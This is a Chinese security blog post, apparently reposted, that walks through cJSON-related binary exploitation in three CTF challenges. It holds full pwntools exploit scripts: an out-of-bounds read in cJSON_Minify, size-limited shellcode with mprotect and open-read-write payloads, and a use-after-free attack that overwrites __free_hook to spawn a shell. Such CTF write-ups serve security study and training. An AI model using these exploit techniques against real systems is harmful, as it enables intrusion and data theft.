#  要好好的看完喔，不然会被暴力的X哟，cjson&json 二进制漏洞利用总结   
闻人语默  老鑫安全   2024-12-29 10:00  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2c0UrtNfEm2cOFDqtsZPHTbGBy8c2o6MutW2sXdR49hwH36PqHvCyLv3PoFKE9ZaeJ3tFpo08Z6oQ/640?wx_fmt=jpeg&from=appmsg "")  
#   
# 简介  
  
**JSON（JavaScript Object Notation）**  
是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成。它以纯文本形式存储和传输数据，广泛应用于客户端和服务器之间的数据交互。  
## JSON格式  
- 键/值对用冒号 :  
 分隔。  
  
- 多个键/值对之间用逗号 ,  
 分隔。  
  
- 对象和数组可以嵌套，即可以在对象中包含其他对象或数组，或者在数组中包含对象或其他数组。  
  
## 每个格式例子  
### 字符串（String）  
```
{    "greeting": "Hello, World!"}
```  
### 数字（Number）  
```
{    "age": 25,    "height": 1.75}
```  
### 布尔值（Boolean）  
```
{    "isStudent": true,    "isGraduated": false}
```  
### 空值（Null）  
```
{    "middleName": null}
```  
### 对象（Object）  
```
{    "person": {        "name": "Bob",        "age": 30    }}
```  
### 数组（Array）  
```
json{    "fruits": ["apple", "banana", "cherry"]}
```  
### 嵌套数组和对象  
```
{    "company": "Tech Corp",    "established": 1999,    "isPublic": true,    "employees": [        {            "name": "Alice",            "age": 28,            "skills": ["Java", "Python"],            "address": {                "city": "New York",                "postalCode": null            }        },        {            "name": "Bob",            "age": 34,            "skills": ["JavaScript", "HTML"],            "address": {                "city": "San Francisco",                "postalCode": "94123"            }        }    ]}
```  
  
cJSON 是一个轻量级的 C 语言库，用于高效地解析和生成 JSON 数据。它提供简单易用的 API，支持基本的 JSON 数据类型，如对象、数组、字符串、数字、布尔值和空值。cJSON 的设计注重性能和内存占用，适合嵌入式系统和资源受限的环境，能够在多种操作系统上运行，广泛用于需要 JSON 数据交互的应用中。  
### 字符串（String）  
## cJSON结构体  
```
typedef struct cJSON{  struct cJSON *next, *prev;  struct cJSON *child;  int type;  char *valuestring;  int valueint;  double valuedouble;  char *string;} cJSON;
```  
- **next**  
: 指向下一个同级 JSON 对象或元素的指针。这使得 cJSON  
 能够形成一个链表，从而支持 JSON 数组和对象的遍历。  
  
- **prev**  
: 指向前一个同级 JSON 对象或元素的指针。与 next  
 一起，这提供了双向遍历的能力。  
  
- **child**  
: 指向当前 JSON 对象的第一个子元素的指针。对于嵌套的 JSON 对象，可以通过这个指针访问子对象或子数组。  
  
type  
 用于区分 JSON 对象的不同类型，具体值及其含义如下：  
```
- 0: `false` — 表示布尔假值- 1: `true` — 表示布尔真值- 2: `null` — 表示空值- 3: `number` — 表示数值（整数或浮点数）- 4: `string` — 表示字符串- 5: `array` — 表示数组- 6: `object` — 表示对象（键值对）
```  
- type  
 与 string  
 和 value*  
 的关系  
  
- type  
 字段决定了当前 cJSON  
 实例的具体类型，这直接影响 string  
 和 value*  
 字段的有效性。  
  
- 只有当 type  
 值为 4  
 时，valuestring  
 字段才有效，意味着只有在当前类型为字符串时，该字段才会被赋予实际的字符串数据。  
  
- 只有当 type  
 值为 3  
 时，valueint  
 或 valuedouble  
 字段才有效，这表明在当前类型为数字时，这些字段将被填充有效的数值数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooAauGIFSu9DC0Ticiauiak5le95M1RvLQ1JFpEEb3wgBUicWPibXQ7OotaQg/640?wx_fmt=png&from=appmsg "")  
## 序列化cJSON结构体  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoovuh46BgYCKYEhOJV4TWCc2mJM7o6HAeGfHwibmxslQo9yrVmzpdD7RQ/640?wx_fmt=png&from=appmsg "")  
# 2021 SCTF dataleak  
## 程序保护  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoozqZMGh2ibnggwkDubuHTJ5FlZ35GN8qC89JicY1OzKf58HLVw62NXIGg/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoooS54xCUsFM3icFfezEElZKjTPyN98zSg0tNblib3eH20Vl0FtRy0DH1g/640?wx_fmt=png&from=appmsg "")  
  
这里初看是没有什么漏洞的，不存在溢出和连带读的情况，但是有个cJSON_minify函数 通过ida对给的libcjson文件静态分析发现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooD2aASZyudROiagxDGveJxkcPe0zlCeGYvLfOQFgNwgy4BzOeB1OyAbQ/640?wx_fmt=png&from=appmsg "")  
  
将这个转化一下为  
```
#include <stdint.h>#include <stdbool.h>void cJSON_Minify(char *json) {    if (!json) return;    char *jsona = json;      uint8_t *into = (uint8_t *)json;     while (*jsona) {        switch (*jsona) {            case ' ': case '\t': case '\r': case '\n':                jsona++; // Skip whitespace                break;            case '/':                if (jsona[1] == '/') {                    while (*jsona && *jsona != '\n') jsona++; // Skip single-line comment                } else if (jsona[1] == '*') {                    jsona += 2; // Skip the /*                    while (*jsona && !(*jsona == '*' && jsona[1] == '/')) {                        if (!*jsona) return; // Exit if we reach the end without closing                        jsona++; // Skip until end of comment                    }                    jsona += 2; // Skip the */                } else {                    *into++ = *jsona++; // Copy character                }                break;            case '"':                *into++ = *jsona++;                while (*jsona && *jsona != '"') {                    *into++ = *jsona++; // Copy character                    if (*(jsona - 1) == '\\') *into++ = *jsona++; // Copy escaped character                }                if (*jsona) *into++ = *jsona++; // Copy closing quote                break;            default:                *into++ = *jsona++; // Copy normal character                break;        }    }    *into = 0; // Null-terminate the new string}
```  
  
这里存在一个注释没有对未闭合进行检测的情况，就比如如果我是/aaaaaaaaaaaaaaaaaa 但是没闭合的话 这种情况就会一直执行这个循环 也就是jsona++但是我们读入是通过   
into++ = *jsona++进行的读入 就会导致我们可以越界读到程序让我们leak的位置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoo6sorx6sNkkfCI2OBBSb43frLuQN6Tz4Lgr2DxNUXsyia54HlJCTXcYw/640?wx_fmt=png&from=appmsg "")  
  
可以看到正常读入是这个样子，此时我们需要泄露的this_is_data_in_server有22字节，按照我们上面的分析如果全是注释没闭合那么，就会把this读入到xxx90的位置，rsi是我们wirite的地址，也就是读出末尾的server  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooqNCQrq8nbW7KHt4nsWSfJlbkQBnWqia2Ff210hSQicOQ697YDV1WUkHQ/640?wx_fmt=png&from=appmsg "")  
  
那么我们就可以通过控制注释的size 来分两次读出flag  
## exp  
```
#!/usr/bin/python3from pwn import *import randomimport osimport sysimport timefrom pwn import *from ctypes import *import json#--------------------setting context---------------------context.clear(arch='amd64', os='linux', log_level='debug')#context.terminal = ['tmux', 'splitw', '-h']sla = lambda data, content: mx.sendlineafter(data,content)sa = lambda data, content: mx.sendafter(data,content)sl = lambda data: mx.sendline(data)rl = lambda data: mx.recvuntil(data)re = lambda data: mx.recv(data)sa = lambda data, content: mx.sendafter(data,content)inter = lambda: mx.interactive()l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))s=lambda data: mx.send(data)log_addr=lambda data: log.success("--->"+hex(data))p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))def dbg():    gdb.attach(mx)#---------------------------------------------------------# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')filename = "./pwn"mx = process(filename)#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)elf = ELF(filename)libc=elf.libc#初始化完成---------------------------------------------------------\s('aaaaaaaa/*'.ljust(0xe,'a'))sleep(0.5)s('aaaaaaaa/*'.ljust(0xe,'b')) #'this_is_dat'flag1=mx.recv(0xb)s('aaaaa/*'.ljust(0xe,'a'))sleep(0.5)s('/*'.ljust(0xe,'b')) #'this_is_dat'flag2=mx.recv(0xb)print(flag1+flag2)inter()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoo8ZDN7fsJmdNnibupxOwuQx4XOJbKUz6sDZhQibrd3J80sIrcyb6H774Q/640?wx_fmt=png&from=appmsg "")  
# 2024 强网拟态 ezcode  
## 程序保护  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooAiah2o4JeTbkNKN6D8NdpLicrJibvdoWauKtxJnlwZz6LNKg8l7Ricxic0A/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooic1L8pQZOt2ciaMe2yIJYlUFMzgaaglHrENCvOxP0UpYeDfOibQJAwLUQ/640?wx_fmt=png&from=appmsg "")  
  
这里有个cJSON_Parse 将JSON字符串反序列化为CJSON结构体 并且cJSON_GetObjectItemCaseSensitive(v7, "shellcode"); 取的是shellcode的值 因此我们只要  
```
{"shellcode":content.hex()}
```  
  
以这个格式就可以传输了 我们可以测试一下  
  
可以看到我们是可以传输的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooC0WAfJRMmCgJnCwF7X1nKyPLepe0ItVs1NzU5J3qt4nN5ibqciaeOKWw/640?wx_fmt=png&from=appmsg "")  
  
但是题目限制了22字节的shellcode 并且此时的0x9998000段是没有可写权限的 因此我们要mprotect赋予权限 并且 再次read一次读入orw的shellcode  
  
这里要设置一下  
  
rdi要为0x9998000 rsi要为len 不变就行 rdx为7  
```
shl edi,12mov ax,10mov dx,7syscall
```  
  
rdi为  
```
xor eax, eax;xor edi, edi;mov dl, 0xff;mov esi, ecx;syscall
```  
  
但是这里是24字节，多了两字节 可以从这里优化mov dx,7 改为lea edx,[rax-3]  
  
刚好22字节 然后就读入shellcode进行orw就可以了  
  
orw_shellcode  
```
mov rdi,rsixor rsi,rsixor rdx,rdxmov rax,2syscallxor rdi,0xcmov rsi,rdixor dl,30mov rdi,raxxor rax,raxsyscallmov rdi,1mov ax,1syscall
```  
## exp  
```
#!/usr/bin/python3from pwn import *import randomimport osimport sysimport timefrom pwn import *from ctypes import *import json#--------------------setting context---------------------context.clear(arch='amd64', os='linux', log_level='debug')#context.terminal = ['tmux', 'splitw', '-h']sla = lambda data, content: mx.sendlineafter(data,content)sa = lambda data, content: mx.sendafter(data,content)sl = lambda data: mx.sendline(data)rl = lambda data: mx.recvuntil(data)re = lambda data: mx.recv(data)sa = lambda data, content: mx.sendafter(data,content)inter = lambda: mx.interactive()l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))s=lambda data: mx.send(data)log_addr=lambda data: log.success("--->"+hex(data))p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))def dbg():    gdb.attach(mx)#---------------------------------------------------------# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')filename = "./vuln"mx = process(filename)#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)elf = ELF(filename)libc=elf.libc#初始化完成---------------------------------------------------------\content=asm('''shl edi, 12mov ax,10lea edx,[rax-3]syscallxor eax, eax;xor edi, edi;mov dl, 0xff;mov esi, ecx;syscall''')print(len(content))payload={"shellcode":content.hex()}sl(json.dumps(payload))orw=asm('''mov rdi,rsixor rsi,rsixor rdx,rdxmov rax,2syscallxor rdi,0xcmov rsi,rdixor dl,30mov rdi,raxxor rax,raxsyscallmov rdi,1mov ax,1syscall''')payload=b'flag\x00'+b'\x00'*5+orwsl(payload)inter()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoomKrDxbuceJYKNibMYRHDcAHt5Todvpm3h3wfqbEIx8e7zvk76ofym1g/640?wx_fmt=png&from=appmsg "")  
# 2024 ciscn决赛 ezheap  
## 程序保护  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoozWufuFdrvrN3Mec79GaQz0NRpLRI5ian3DvN0VGwZgFngXvtLHk2WXw/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooZwOm46DfbZfQIzWDbtYQYwaK23PPlicUiblD551eXPgWbQiajiaghyMT2A/640?wx_fmt=png&from=appmsg "")  
  
从这里可以看出来是有一个取值的过程，并且是相互对应的，如果没有取出来则会进入error退出程序  
  
而v10来源于v13经过处理函数，跟进这个函数发现：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooDic1ibKwaFbKOex2RFSaoibjt2YAnKlJSQvnTIdYtibRPMzl5TOdKPAlmg/640?wx_fmt=png&from=appmsg "")  
  
存在一些json格式的特征，像null false true这种就是json格式中的布尔值，同时也有闭合{}的检测 因此可以基本确定发送的是json格式  
### 交互脚本  
```
def add(size,cont):    payload='{'+'"choice":"new",'+'"index":1,'+f'"length":{size},'+'"message":'+'"'    payload=payload.encode()    payload+=cont    payload+=b'"'+b'}'    sl(payload)def delete(num):    payload = f'{{"choice":"rm","index":{num},"length":32,"message":"aaa"}}'    rl("Please input:")    sl(payload)def show(num):    payload = f'{{"choice":"view","index":{num},"length":32,"message":"aaa"}}'    rl("Please input:")    sl(payload)def edit(idx,len,cont):    payload='{'+'"choice":"modify",'+f'"index":{idx},'+f'"length":{len},'+'"message":'+'"'    payload=payload.encode()    payload+=cont    payload+=b'"'+b'}'    print(payload)    sl(payload)
```  
## 漏洞分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmoouJ26vk7zgBn2MWT7e5iaEFyV9kI7NtfHLzkU7varh1SLpJ9GApAdBsQ/640?wx_fmt=png&from=appmsg "")  
  
没有置0 这里存在uaf漏洞 并且是2.31 存在uaf漏洞且没限制基本随便打了，这里难点就是因为是json的传输，导致泄露的时候会有一些干扰 我们要通过调试来调整传输的东西进行泄露  
## exp  
```
#!/usr/bin/python3from pwn import *import randomimport osimport sysimport timefrom pwn import *from ctypes import *#--------------------setting context---------------------context.clear(arch='amd64', os='linux', log_level='debug')#context.terminal = ['tmux', 'splitw', '-h']sla = lambda data, content: mx.sendlineafter(data,content)sa = lambda data, content: mx.sendafter(data,content)sl = lambda data: mx.sendline(data)rl = lambda data: mx.recvuntil(data)re = lambda data: mx.recv(data)sa = lambda data, content: mx.sendafter(data,content)inter = lambda: mx.interactive()l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))s=lambda data: mx.send(data)log_addr=lambda data: log.success("--->"+hex(data))p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))def dbg():    gdb.attach(mx)#---------------------------------------------------------# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')filename = "./pwn"mx = process(filename)#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)elf = ELF(filename)libc=elf.libc#初始化完成---------------------------------------------------------\def add(size,cont):    payload='{'+'"choice":"new",'+'"index":1,'+f'"length":{size},'+'"message":'+'"'    payload=payload.encode()    payload+=cont    payload+=b'"'+b'}'    sl(payload)def delete(num):    payload = f'{{"choice":"rm","index":{num},"length":32,"message":"aaa"}}'    rl("Please input:")    sl(payload)def show(num):    payload = f'{{"choice":"view","index":{num},"length":32,"message":"aaa"}}'    rl("Please input:")    sl(payload)def edit(idx,len,cont):    payload='{'+'"choice":"modify",'+f'"index":{idx},'+f'"length":{len},'+'"message":'+'"'    payload=payload.encode()    payload+=cont    payload+=b'"'+b'}'    print(payload)    sl(payload)add(0x400,b'a') #0add(0x400,b'a') #1delete(0)for i in range(6):    edit(0,0x400,b'a'*0x10)    delete(0)dbg()delete(1)add(0x60,b'') #2edit(2,1,b'\xe0')show(2)libc_addr=l64()-0x1ecbe0log_addr(libc_addr)libc.address=libc_addrsystem=libc.sym['system']free_hook=libc.sym['__free_hook']edit(0,0x8,p64(free_hook)[:6])add(0x400,b'a;/bin/sh')#edit(2,0x10,b'/bin/sh\x00')#add(0x400,b'a')edit(4,0x8,p64(system)[:6])delete(3)inter()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2d45OcnNWU2ial3fMkzvqmooTWXV9WNQpPqG6vhyp9lic0l9LIbn6iaGIgMNfpQTfBxlLPsbaxI0EhmQ/640?wx_fmt=png&from=appmsg "")  
原文l链接：https://xz.aliyun.com/t/16928  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2c0UrtNfEm2cOFDqtsZPHTb4vfdpmicgKC9NPzZuQUTTac0FSjcwpb5nL3U8VO1U3ejarc8Gnp7RoQ/640?wx_fmt=png&from=appmsg "")  
  
更多姿势知识星球：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2cHOlXibItr7xwSyoH6hjNOahd6XUoSb4DwhS4kPKSKiaxLIRT6ESpqLO7T0noAjoENEtEWhSodZrcQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
相关课程：  
  
[【双11活动】V2024-12老鑫安全培训](https://mp.weixin.qq.com/s?__biz=MzU0NDc0NTY3OQ==&mid=2247488016&idx=1&sn=8a5fc1fa3044f8edbf833a5d11cbdbf8&scene=21#wechat_redirect)  
  
  
  
相关活动：  
  
[星期四吃什么，就吃KFC，随机抽取5位幸运嘉宾](https://mp.weixin.qq.com/s?__biz=MzU0NDc0NTY3OQ==&mid=2247488267&idx=1&sn=13091ad7a445f81c73f64462a139014e&scene=21#wechat_redirect)  
  
  
  
